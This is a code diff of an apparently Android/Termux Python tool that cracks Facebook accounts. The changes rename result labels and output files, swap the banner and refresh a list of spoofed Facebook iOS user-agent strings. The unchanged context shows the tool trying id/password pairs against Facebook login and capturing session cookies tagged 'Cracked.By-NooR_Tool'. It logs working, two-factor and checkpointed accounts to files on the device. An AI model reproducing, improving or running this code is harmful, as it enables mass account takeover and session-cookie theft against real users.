@@ -1,4 +1,4 @@
-#/data/data/com.termux/files/usr/bin/python3.12
+#!/data/data/com.termux/files/usr/bin/python3.12
 # -*- coding: utf-8 -*-
 #REVISED BY S. SHAJON
 #----------------\<-IMPORT-MODULE->/----------------#
@@ -134,7 +134,7 @@ def _____UpDaTe_S2_____():
     fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
     bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
     agent3 = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
-    iphone3 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) BC3 iOS/3.12.4 (build 523; iPhone XS Max; iOS 13.4)"+"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"+"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) BC3 iOS/3.12.4 (build 523; iPhone XR; iOS 13.3.1)"+"Mozilla/5.0 (iPad; CPU OS 12_4_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"+"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko)"+"]Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko)"+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/605.1.15 (KHTML, like Gecko)'])
+    iphone3 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C114 [FBAN/FBIOS;FBAV/151.0.0.61.202;FBBV/82156572;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iOS;FBSV/11.2;FBSS/3;FBCR/SFR;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/83160404]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/440.0.0.27.105;FBBV/534883268;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_Qaau_IT;FBOP/5;FBRV/537932531]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H364 [FBAN/FBIOS;FBAV/441.1.0.27.105;FBBV/539464914;FBDV/iPhone9,2;FBMD/iPhone;FBSN/iOS;FBSV/15.7.8;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/541069100]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/276.0.0.32.107;FBBV/235827610;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/13.6;FBSS/3;FBCR/;FBID/phone;FBLC/en;FBOP/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20D67 [FBAN/FBIOS;FBAV/412.0.0.40.114;FBBV/469153370;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/16.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/471145542]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19E258 [FBAN/FBIOS;FBAV/475.0.0.31.110;FBBV/627850395;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/15.4.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/630494309;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 [FBAN/FBIOS;FBAV/174.0.0.48.98;FBBV/110921384;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.1;FBSS/3;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/112241032]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/159.0.0.48.97;FBBV/91994325;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/92489346]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 [FBAN/FBIOS;FBAV/155.0.0.36.93;FBBV/87992437;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/11.1.1;FBSS/2;FBCR/MEO;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/89136215]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15G77 [FBAN/FBIOS;FBAV/182.0.0.42.80;FBBV/118457561;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.4.1;FBSS/2;FBCR/POST;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/119485025]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/165.0.0.74.96;FBBV/100174821;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_PT;FBOP/5;FBRV/100948865]'])
     ___Noor_on_Fire___ = ''+str(iphone3)+' '+str(agent3)
     return ___Noor_on_Fire___
 #----------------\<-VERSION->/----------------#
@@ -144,14 +144,9 @@ __COUNTRYS__ = af['country'].upper()
 xlinex = (f"{G}━"*56)
 #----------------\<-LOGO->/----------------#
 logo = f"""
-{G} 
-        
-░▀█▀░▀█▀░█▀▀░█▀▀░█▀▄░░
-░░█░░░█░░█░█░█▀▀░█▀▄░░
-░░▀░░▀▀▀░▀▀▀░▀▀▀░▀░▀░░
-                   ●{W}  DEVELOPER {xpxx} NOOR{G}-{W}404
-{W}                  {G}{W}{G}  ●{W}  STATUS    {xpxx} FREE
-{G}                 ●{W}  VERSION   {xpxx} V{G}/{W}{version}
+{G}   ┏━┓┏━╸┏━┓   ╻ ╻╺┳┓  ●{W}  DEVELOPER {xpxx} NOOR{G}-{W}404
+{W}   ┗━┓┣╸ ┣━┫{G}╺━╸{W}┏╋┛ ┃┃{G}  ●{W}  STATUS    {xpxx} FREE
+{G}   ┗━┛┗━╸╹ ╹   ╹ ╹╺┻┛  ●{W}  VERSION   {xpxx} V{G}/{W}{version}
 {xlinex}
 {W}         👑 MIND IT NOTHING IS IMPOSSIBLE 👑
 {xlinex}
@@ -205,7 +200,7 @@ class __SEAXNOOR__:
     #----------------\<-FILE-MENU->/----------------#
     def __FILEX__(self) -> None:
         __CLEAR__()
-        print(f"{xp} EXAMPLE  {xpxx} {G}/{W}sdcard{G}/{W}SIM.txt {G}/{W}OR{G}/{W} SIM.txt ")
+        print(f"{xp} EXAMPLE  {xpxx} {G}/{W}sdcard{G}/{W}SEA.txt {G}/{W}OR{G}/{W} SEA.txt ")
         __LINE__()
         __fileloX__ = input(f"{xpx} INPUT FILE PATH {xpxx} ")
         try:
@@ -442,7 +437,7 @@ class __SEAXNOOR__:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
-                    print(f'\r{xp}{W}-{G}<[{B}SIM-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
+                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -450,7 +445,7 @@ class __SEAXNOOR__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/SEA-XD/FILE/SIM-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/SEA-XD/FILE/SEA-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M1 : {ids}|{pas}|{cookie}"
@@ -460,14 +455,14 @@ class __SEAXNOOR__:
                 if twf in str(po):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SIM-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/SEA-XD/FILE/SEA-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
 
                 if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SIM-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/SEA-XD/FILE/SEA-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
@@ -589,13 +584,13 @@ class __SEAXNOOR__:
                 if twf in str(po):
                     if 'y' in self.__CP__:
                         print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/S-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                    open('/sdcard/SEA-XD/FILE/SEA-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
                 if 'www.facebook.com' in po['error']['message']:
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{R}SIM-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SIM-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/SEA-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
@@ -704,7 +699,7 @@ class __SEAXNOOR__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/SEA-XD/FILE/SIM-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/SEA-XD/FILE/SEA-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M3 : {ids}|{pas}|{cookie}"
@@ -712,14 +707,14 @@ class __SEAXNOOR__:
                     break
                 if twf in str(po):
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{Y}SIM-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SIM-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/SEA-M3-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
                 if 'www.facebook.com' in po['error']['message']:
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{R}SIM-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SIM-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/SEA-M3-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
@@ -811,7 +806,7 @@ class __SEAXNOOR__:
                     ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                     cookie = f'sb=Cracked.By-NooR_Tool;{ssbb};{ckkk}'
-                    print(f'\r{xp}{W}-{G}<[{B}SIM-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
+                    print(f'\r{xp}{W}-{G}<[{B}SEA-OK{G}]>{B} ' + ids + f' / ' + pas + '\033[1;97m')
                     if 'y' in self.__COOKIE__:
                         colorX = random.choice([
                             "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
@@ -819,7 +814,7 @@ class __SEAXNOOR__:
                             "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                         ])
                         print(f'\r{xp}{W}-{G}<[{B}COOKIE{G}]>{colorX} ' + cookie + '\n')
-                    open('/sdcard/SEA-XD/FILE/SIM-M4-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
+                    open('/sdcard/SEA-XD/FILE/SEA-M4-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                     self.oks.append(ids)
                     if len(self.oks) % 2 == 0:
                         idspas = f"M4 : {ids}|{pas}|{cookie}"
@@ -827,14 +822,14 @@ class __SEAXNOOR__:
                     break
                 if twf in str(po):
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{Y}SIM-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SIM-M4-2F.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{Y}SEA-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/SEA-M4-2F.txt', 'a').write(ids + '/' + pas + '\n')
                     self.twf.append(ids)
                     break
                 if 'www.facebook.com' in po['error_msg']:
                     if 'y' in self.__CP__:
-                        print(f'\r{xp}{W}-{G}<[{R}SIM-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
-                    open('/sdcard/SEA-XD/FILE/SIM-M4-CP.txt', 'a').write(ids + '/' + pas + '\n')
+                        print(f'\r{xp}{W}-{G}<[{R}SEA-CP{G}]>{R} ' + ids + f' / ' + pas + '\033[1;97m')
+                    open('/sdcard/SEA-XD/FILE/SEA-M4-CP.txt', 'a').write(ids + '/' + pas + '\n')
                     self.cps.append(ids)
                     break
                 else:
